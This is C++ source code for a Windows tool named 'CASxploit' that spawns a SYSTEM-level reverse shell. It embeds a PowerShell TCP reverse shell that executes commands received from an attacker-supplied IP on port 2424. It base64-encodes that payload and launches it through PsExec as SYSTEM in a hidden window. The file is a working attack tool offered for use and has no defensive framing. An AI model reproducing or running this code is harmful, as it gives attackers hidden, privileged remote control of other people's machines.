#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

void set_color(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void print_status(const std::string& msg) {
    set_color(10);
    std::cout << "[*] " << msg << std::endl;
    set_color(7);
}

std::string base64_encode(const std::vector<BYTE>& bytes) {
    const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string ret;
    int val = 0, valb = -6;
    for (unsigned char c : bytes) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            ret.push_back(chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) ret.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (ret.size() % 4) ret.push_back('=');
    return ret;
}

std::string utf8_to_utf16le_base64(const std::string& utf8_str) {
    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, NULL, 0);
    if (wlen == 0) return "";
    std::wstring wstr(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, &wstr[0], wlen);

    size_t byte_len = (wlen - 1) * sizeof(wchar_t);
    std::vector<BYTE> bytes(byte_len);
    memcpy(bytes.data(), wstr.c_str(), byte_len);

    return base64_encode(bytes);
}

int main() {
    set_color(10);
    std::cout << "=== CASxploit - SYSTEM Reverse Shell (UAC Bypass via PsExec) ===" << std::endl;
    set_color(7);

    std::string lhost;
    std::cout << "Enter LHOST (attacker IP, reachable from this machine): ";
    std::cin >> lhost;
    std::string lport = "2424";

    std::string ps_payload =
        "$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        "    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "    $sendback = (iex $data 2>&1 | Out-String );"
        "    $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
        "    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "    $stream.Write($sendbyte,0,$sendbyte.Length);"
        "    $stream.Flush()"
        "};"
        "$client.Close()";

    size_t pos = ps_payload.find("{lhost}");
    if (pos != std::string::npos) ps_payload.replace(pos, 7, lhost);
    pos = ps_payload.find("{lport}");
    if (pos != std::string::npos) ps_payload.replace(pos, 7, lport);

    if (GetFileAttributes("PsExec64.exe") == INVALID_FILE_ATTRIBUTES) {
        set_color(12);
        std::cerr << "[-] ERROR: PsExec64.exe not found in the current directory." << std::endl;
        set_color(7);
        system("pause");
        return 1;
    }

    std::string encoded_cmd = utf8_to_utf16le_base64(ps_payload);
    if (encoded_cmd.empty()) {
        set_color(12);
        std::cerr << "[-] ERROR: Failed to encode payload." << std::endl;
        set_color(7);
        system("pause");
        return 1;
    }

    std::string cmdLine =
        "PsExec64.exe -accepteula -i -s -d powershell.exe -WindowStyle Hidden -EncodedCommand " +
        encoded_cmd;

    print_status("Spawning SYSTEM reverse shell to " + lhost + ":" + lport + " via PsExec...");

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(
            NULL,
            &cmdLine[0],
            NULL, NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL, NULL,
            &si, &pi)) {
        set_color(12);
        std::cerr << "[-] CreateProcess failed. Error: " << GetLastError() << std::endl;
        set_color(7);
        system("pause");
        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    print_status("Payload executed. Make sure your listener is running on port 2424!");
    set_color(7);
    system("pause");
    return 0;
}